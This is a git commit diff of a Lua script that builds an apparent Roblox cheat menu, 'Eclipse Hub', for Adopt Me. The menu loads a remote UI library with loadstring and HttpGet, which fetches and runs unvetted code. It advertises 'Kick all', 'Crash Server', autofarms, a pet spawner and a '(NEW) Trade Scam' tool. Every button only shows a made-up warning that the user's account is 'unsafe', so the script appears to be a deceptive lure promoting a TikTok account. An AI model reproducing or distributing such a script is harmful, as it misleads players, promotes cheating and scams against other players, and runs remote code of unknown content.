3d72d2ac89678f96e588c5fd21e96298bebe4b8d
Sanjxz <36453187+HyperRamzey@users.noreply.github.com>
2025-05-13 07:36:11 -0700

    Update gui3.lua

--- gui3.lua
+++ gui3.lua
@@ -1,20 +1,37 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
---[[
-]]
---[[
-local colors = {
-SchemeColor = Color3.fromRGB(255, 0, 0),
-Background = Color3.fromRGB(15,15,15),
-Header = Color3.fromRGB(15,15,15),
-TextColor = Color3.fromRGB(255,255,255),
-ElementColor = Color3.fromRGB(255, 0, 0)
-}
-]]
-local Window = Library.CreateLib("X-HUB", "RJTheme3")
-local Tab = Window:NewTab("Main")
-local Section = Tab:NewSection("Error: Unsafe to execute in this environment \n\r Features wont work, try a different account!")
-local Section = Tab:NewSection("Or server / executor. Delta on android \n\r or ios is recommeneded")
-Section:NewLabel("Weapon/Pet Spawner")
-Section:NewTextBox("Input Item Name", "Item Spawner", function(txt)
-print(txt)
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+
+local win = DiscordLib:Window("Eclipse Hub")
+
+local serv = win:Server("AdoptMe Eclipse HUB", "")
+
+local btns = serv:Channel("Universal")
+
+btns:Button("Kick all", function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
 end)
+
+btns:Seperator()
+
+btns:Button("Crash Server", function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
+end)
+
+local tgls = serv:Channel("Autofarm, TS")
+
+tgls:Toggle("Pet AutoFarm",false, function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
+end)
+tgls:Toggle("Baby AutoFarm",false, function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
+end)
+tgls:Toggle("(NEW) Trade Scam",false, function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
+end)
+
+local textbs = serv:Channel("Pet Spawner")
+
+textbs:Textbox("Pet Spawner", "Type pet name here!", true, function()
+DiscordLib:Notification("Notification", "Error! Your account is unsafe. Try different one.", "Okay!")
+end)
+
+serv:Channel("tt @yohd57 eclipseHUB")
